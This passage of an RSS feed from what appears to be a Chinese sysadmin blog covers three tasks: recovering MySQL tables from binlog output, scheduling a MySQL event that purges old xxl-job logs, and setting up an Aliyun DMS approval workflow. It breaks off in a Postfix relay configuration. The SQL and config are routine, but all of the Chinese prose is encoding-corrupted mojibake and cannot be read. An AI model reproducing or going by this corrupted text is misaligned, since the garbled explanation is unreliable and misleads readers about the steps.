&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET @@session.sql_mode&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1168113696/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET @@session.auto_increment_increment&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1, @@session.auto_increment_offset&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/*!&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt; utf8mb4 *//*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET @@session.character_set_client&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;255,@@session.collation_connection&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;255,@@session.collation_server&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;255/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET @@session.lc_time_names&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET @@session.collation_database&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DEFAULT/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/*!80011 SET @@session.default_collation_for_utf8mb4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;255*//*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DROP TABLE &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;pets&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;.&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cats&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; /* generated by server */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# at 260734009&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#200311 20:07:48 server id 1  end_log_pos 434 CRC32 0x123d65df 	Anonymous_GTID	last_committed=1	sequence_number=2	rbr_only=no	original_committed_timestamp=1583971668462467	immediate_commit_timestamp=1583971668462467	transaction_length=473&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# original_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# immediate_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/*!80001 SET @@session.original_commit_timestamp&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1583971668462467*//*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/*!80014 SET @@session.original_server_version&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80019*//*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/*!80014 SET @@session.immediate_server_version&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80019*//*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET @@SESSION.GTID_NEXT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ANONYMOUS&amp;#39;&lt;/span&gt;/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# at 260734188&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#200311 20:07:48 server id 1  end_log_pos 828 CRC32 0x57fac9ac 	Query	thread_id=16	exec_time=0	error_code=0	Xid = 217&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;pets&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET &lt;span class=&#34;nv&#34;&gt;TIMESTAMP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1583971668/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/*!80013 SET @@session.sql_require_primary_key&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0*//*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CREATE TABLE dogs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬è¿˜æ˜¯å…ˆæ‰¾åˆ° binlog ä¸­  drop table ä¹‹ç±»çš„æ“ä½œå­—æ ·ï¼Œç„¶åç¡®å®š position åï¼ŒæŠŠ binlog.00009 ä¸­ä¹‹å‰çš„ log å¯¼å‡ºã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>è®¾ç½®Mysqlè‡ªåŠ¨å®šæ—¶åˆ é™¤xxljobçš„æ—¥å¿—æ•°æ®</title>
      <link>https://rendoumi.com/posts/20240320-mysql_delete_xxllog/</link>
      <pubDate>Wed, 20 Mar 2024 09:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240320-mysql_delete_xxllog/</guid>
      <description>&lt;p&gt;xxl-jobçš„æ—¥å¿—æ•°æ®å®åœ¨æ˜¯å¤ªå¤§äº†ï¼Œå‹æ ¹å°±æ²¡æœ‰æ¸…ç†è¿‡ï¼Œè®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡æ¥å®šæ—¶åˆ é™¤æ— ç”¨çš„åºŸæ•°æ®å§ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆè¦ç¡®è®¤å®šæ—¶ä»»åŠ¡å¼€å…³å·²ç»æ‰“å¼€äº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;show variables like &lt;span class=&#34;s1&#34;&gt;&amp;#39;event_scheduler&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Onè¡¨ç¤ºå¼€å¯
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶ååˆ°æŒ‡å®šçš„åº“ä¸‹ï¼Œ&lt;code&gt;use k8s_xxl_job&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CREATE EVENT delete_k8s_xxl_log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ON SCHEDULE EVERY &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; DAY
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DO
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DELETE FROM xxl_job_log WHERE trigger_time &amp;lt; CURRENT_TIMESTAMP - INTERVAL &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; DAY&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ä¿ç•™ä»Šå¤©çš„æ•°æ®ï¼Œä»¥åŠå‰7å¤©çš„è€æ•°æ®ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŸ¥çœ‹ä»¥åŠç¼–è¾‘å®šæ—¶ä»»åŠ¡çš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æŸ¥çœ‹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;show events&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æŸ¥çœ‹ç»†èŠ‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SHOW CREATE EVENT delete_k8s_xxl_log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#ç¼–è¾‘&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ALTER EVENT delete_k8s_xxl_log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ON SCHEDULE EVERY &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; DAY
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DO
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;BEGIN
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -- åœ¨è¿™é‡Œæ·»åŠ ä½ æƒ³è¦æ‰§è¡Œçš„æ“ä½œ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;END&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>é˜¿é‡Œäº‘DMSç®¡ç†æ•°æ®åº“å˜æ›´å®¡æ‰¹æµ</title>
      <link>https://rendoumi.com/posts/20240305-aliyun_dms/</link>
      <pubDate>Tue, 05 Mar 2024 09:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240305-aliyun_dms/</guid>
      <description>&lt;p&gt;å…¶å®æˆ‘ä»¬ç”¨çš„æ˜¯yearningæ¥ç®¡ç† MySQL æ•°æ®åº“å˜æ›´éœ€æ±‚çš„ï¼Œä½†æ˜¯ï¼Œç±»ä¼¼ Oracle æˆ–è€… PolarDBï¼Œå°±ç”¨ä¸æˆäº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™äº‹åªèƒ½äº¤ç»™é˜¿é‡Œäº‘çš„dmsæ¥ç®¡ç†äº†ï¼Œå…¶å®dmsè¦æ¯”yearningå¼ºå¤§å¾ˆå¤šï¼Œå¯ä»¥ç²¾ç¡®æ§åˆ¶åˆ°è¡¨çš„è¡Œçº§åˆ«æƒé™çš„ã€‚&lt;/p&gt;
&lt;p&gt;ç†ç”±å°±æ˜¯dmsæ˜¯ä¸ªwebé¡µé¢ï¼Œä»£ç†è¿æ¥åˆ°åç«¯çš„æ•°æ®åº“ï¼Œæ‰€ä»¥è¦æ˜¾ç¤ºä»€ä¹ˆï¼Œä¸è¦æ˜¾ç¤ºä»€ä¹ˆï¼Œä»webç•Œé¢æ˜¯å®Œå…¨å¯ä»¥æ§åˆ¶çš„ã€‚å®é™…åˆ°æ•°æ®åº“çº§åˆ«åè€Œæœ‰çš„æ˜¯æ§åˆ¶ä¸ä½çš„ã€‚&lt;/p&gt;
&lt;p&gt;è¿™å°±æ¢³ç†ä¸€ä¸‹å»ºç«‹å®¡æ‰¹æµçš„æ­¥éª¤ï¼š&lt;/p&gt;
&lt;h4 id=&#34;ä¸€dmsåŒæ­¥ramç”¨æˆ·&#34;&gt;ä¸€ã€dmsåŒæ­¥ramç”¨æˆ·&lt;/h4&gt;
&lt;p&gt;ramç”¨æˆ·æ˜¯ç®¡ç†çš„åŸºç¡€äº†ï¼Œè¿™äº›ç”¨æˆ·å¿…é¡»å…ˆè¡Œå¯¼å…¥dmsï¼Œæˆ‘ä»¬æ‰èƒ½è¿›ä¸€æ­¥èµ‹äºˆownerï¼ŒDBAçš„æƒé™&lt;/p&gt;
&lt;p&gt;ç”¨æˆ·ç®¡ç†&amp;ndash;&amp;gt;åŒæ­¥å­è´¦å·ï¼Œé€‰æ‹©è¦dmsè¦ä½¿ç”¨çš„è´¦å·åŒæ­¥è¿‡æ¥å³å¯&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305163935106&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305163935106.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;äºŒè®¾å®šå®ä¾‹dba&#34;&gt;äºŒã€è®¾å®šå®ä¾‹DBA&lt;/h4&gt;
&lt;p&gt;DMSé‡Œçš„æƒé™æ˜¯è¿™æ ·çš„ï¼šåº“çš„è¯æœ‰Ownerï¼Œç„¶åå®ä¾‹çš„è¯æœ‰DBAï¼Œæœ€ä¸Šæ˜¯ç®¡ç†å‘˜ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆä¸€ä¸ªå®ä¾‹é‡Œæœ‰å‡ ä¸‡å¼ è¡¨ï¼Œæ²¡äººä¼šæƒ³ä¸€ä¸ªä¸€ä¸ªç‚¹å‡»èµ‹Ownerçš„æƒé™å§ã€‚&lt;/p&gt;
&lt;p&gt;é‚£å°±ç²—åˆ†ä¸€ä¸‹ï¼Œä¸€ä¸ªäººå¯¹æ•´ä¸ªå®ä¾‹æœ‰æƒé™å®¡æ‰¹å³å¯ã€‚è¿™æ ·è¦å…ˆè®¾å®šæ•´ä¸ªå®ä¾‹çš„DBAè§’è‰²ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆç¼–è¾‘ç”¨æˆ·ï¼Œè®©ä»–æœ‰DBAçš„è§’è‰²ï¼Œä»¥ä¾›ä¹‹ååœ¨å®ä¾‹çº§åˆ«å¯ä»¥é€‰æ‹©ä»–&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305164233341&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305164233341.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå»å®ä¾‹ç®¡ç†é‡Œé¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305164150203&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305164150203.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©å®ä¾‹çš„å³è¾¹ï¼Œæ›´å¤š&amp;ndash;&amp;gt;ç¼–è¾‘å®ä¾‹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305164629786&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305164629786.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å®ä¾‹çš„è´¦å·ã€å¯†ç ã€å®‰å…¨ååŒã€å®‰å…¨è§„åˆ™éƒ½é€‰ä¸Šï¼Œç„¶åé«˜çº§ä¿¡æ¯é‡Œï¼Œå®ä¾‹DBAå°±å¯ä»¥é€‰æ‹©åˆšæ‰è®¾ç½®äº†DBAè§’è‰²çš„äººäº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305164843708&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305164843708.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305164811202&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305164811202.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;ä¸‰è®¾ç½®å®¡æ‰¹æµç¨‹&#34;&gt;ä¸‰ã€è®¾ç½®å®¡æ‰¹æµç¨‹&lt;/h4&gt;
&lt;p&gt;ç„¶åå»å®‰å…¨ä¸è§„èŒƒï¼Œå®¡æ‰¹æµç¨‹ï¼Œæ–°å¢å®¡æ‰¹æ¨¡æ¿ï¼Œæ¥è‡ªå®šä¹‰å®¡æ‰¹æµ&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305165022278&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305165022278.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…¬å¸çš„å®¡æ‰¹æµä¸æ˜¯380ç¼ºçœé‚£ä¸ªï¼Œ380æ˜¯éœ€è¦ä¸‰ä¸ªäººå®¡æ‰¹çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305165111340&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305165111340.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çš„é“¾è·¯å°±å¾ˆå»ºå•äº†ï¼Œæœ‰æ“ä½œæƒé™çš„äººæ‰¾å®ä¾‹çš„DBAå®¡æ‰¹ï¼Œç„¶åè¿‡æœ€é«˜ç®¡ç†å‘˜æ‰¹å°±å®Œäº†ï¼Œæ‰€ä»¥åšå¦‚ä¸‹çš„æµç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305165212283&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305165212283.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;å››è®¾ç½®å®‰å…¨è§„åˆ™&#34;&gt;å››ã€è®¾ç½®å®‰å…¨è§„åˆ™&lt;/h4&gt;
&lt;p&gt;æˆ‘ä»¬å†åˆ°å®‰å…¨ä¸è§„èŒƒï¼Œç‚¹å‡»å®‰å…¨è§„åˆ™ï¼Œæ‰¾åˆ°å…·ä½“å®ä¾‹é‡Œè®¾ç½®çš„ å¼ºç®¡æ§æ¨¡å¼ for MySQL&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305165325268&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305165325268.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°å·²ç»æœ‰2ä¸ªå®ä¾‹ç”¨ä¸Šäº†ï¼Œç„¶ååˆ°å³è¾¹ï¼Œç‚¹å‡»ç¼–è¾‘ï¼š&lt;/p&gt;
&lt;p&gt;æœ€ä¸»è¦çš„å°±æ˜¯SQLå˜æ›´ï¼Œæ•°æ®å˜æ›´é»˜è®¤å®¡æ‰¹æ¨¡æ¿çš„è®¾ç½®ï¼Œæˆ‘ä»¬æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„å®¡æ‰¹æµå³å¯&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305165536661&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305165536661.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å…¶ä»–çš„é€‰é¡¹éƒ½å¯ä»¥æŒ‰éœ€è¿›è¡Œä¿®æ”¹ã€‚&lt;/p&gt;
&lt;h4 id=&#34;äº”è®¾ç½®ç”¨æˆ·æƒé™&#34;&gt;äº”ã€è®¾ç½®ç”¨æˆ·æƒé™&lt;/h4&gt;
&lt;p&gt;å¦‚ä¸Šå®¡æ‰¹æµå°±å®Œæˆäº†ï¼Œæˆ‘ä»¬è¦ç™»å½•å…·ä½“çš„å®ä¾‹åˆ—è¡¨ï¼Œå†æ›´å¤šé‡Œè®¾ç½®æƒé™&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305170005552&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305170005552.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ³¨æ„ä¸Šé¢æ˜¯è®¾ç½®çš„å®ä¾‹çº§åˆ«çš„æƒé™ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœè¦è®¾ç½®æ›´ç»†çº§åˆ«çš„åº“ã€è¡¨ã€è¡Œæƒé™ï¼Œéœ€è¦ç‚¹å‡»æ•°æ®åº“åˆ—è¡¨&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305170156449&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305170156449.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åœ¨è¿™é‡Œé¢çš„è¡¨è¯¦æƒ…çš„å³è¾¹æ›´å¤šï¼Œå¯ä»¥æ§åˆ¶åº“ã€è¡¨ã€è¡Œçš„æƒé™&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240305170334390&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240305-aliyun_dms/image-20240305170334390.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ ·å°±å¯ä»¥å¼„å®Œæ•´ä¸ªæµç¨‹äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>é‚®ç®±åœ°å€æ— æ•ˆå¯¼è‡´ç¾¤å‘é‚®ä»¶å¤±è´¥</title>
      <link>https://rendoumi.com/posts/20240304-posfix_relay/</link>
      <pubDate>Mon, 04 Mar 2024 09:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240304-posfix_relay/</guid>
      <description>&lt;p&gt;è¿™ä¸ªé—®é¢˜ååˆ†çš„è®¨åŒå•Šï¼ŒBiå¤§æ•°æ®éƒ¨ä¼šç¾¤å‘æŠ¥è¡¨é‚®ä»¶ï¼Œä½†æ˜¯å¦‚æœæœ‰æŸä½å‘˜å·¥ç¦»èŒäº†ï¼Œé‚®ä»¶åœ°å€è¢«æ¸…ç†æ‰ä¸å­˜åœ¨äº†ï¼Œé‚£ä¹ˆç¾¤å‘é‚®ä»¶çš„æ—¶å€™ä¼šå¯¼è‡´ç¾¤å‘å¤±è´¥ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ä¸Šæœç´¢äº†ä¸€åœˆï¼Œé˜¿é‡Œæœ‰ç¯‡æ–‡ç« æ˜¯åŒæ ·é—®é¢˜ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/javaee_sunny/article/details/114836546&#34;&gt;https://blog.csdn.net/javaee_sunny/article/details/114836546&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è§£å†³æ–¹æ³•æ˜¯ä¿®æ”¹å‘é€ç¨‹åºï¼Œå‰”é™¤æ‰å¤±æ•ˆçš„é‚®ä»¶åœ°å€å†å‘ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ–¹æ³•åœ¨æˆ‘ä»¬è¿™é‡Œæ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸ºå‘é€ç¨‹åºæ²¡äººç»´æŠ¤äº†ï¼Œæ— æ³•ä¿®æ”¹ã€‚&lt;/p&gt;
&lt;p&gt;é‚£å°±åªèƒ½æ›²çº¿æ•‘å›½äº†ï¼šå»ºç«‹ä¸€ä¸ªè½¬å‘æœåŠ¡å™¨ï¼ŒæŠŠç¾¤å‘é‚®ä»¶å˜æˆä¸€å°ä¸€ä»½å•ç‹¬å‘ï¼Œé‚£ä¹ˆå¶å°”ä¸€ä»½å¤±è´¥å°±å¤±è´¥äº†ï¼Œä¸ä¼šå¯¼è‡´æ•´ä¸ªç¾¤å‘çš„å¤±è´¥ã€‚&lt;/p&gt;
&lt;p&gt;æ­å»ºä¸€ä¸ªPostfix relayè½¬å‘æœåŠ¡å™¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/postfix/main.cf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;relayhost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;smtp.qiye.aliyun.com&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:587
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;smtp_sasl_auth_enable&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;smtp_sasl_password_maps&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; hash:/etc/postfix/sasl_passwd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;smtp_sasl_security_options&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; noanonymous
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;smtp_use_tls&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;smtp_tls_CAfile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /etc/pki/tls/certs/ca-bundle.crt
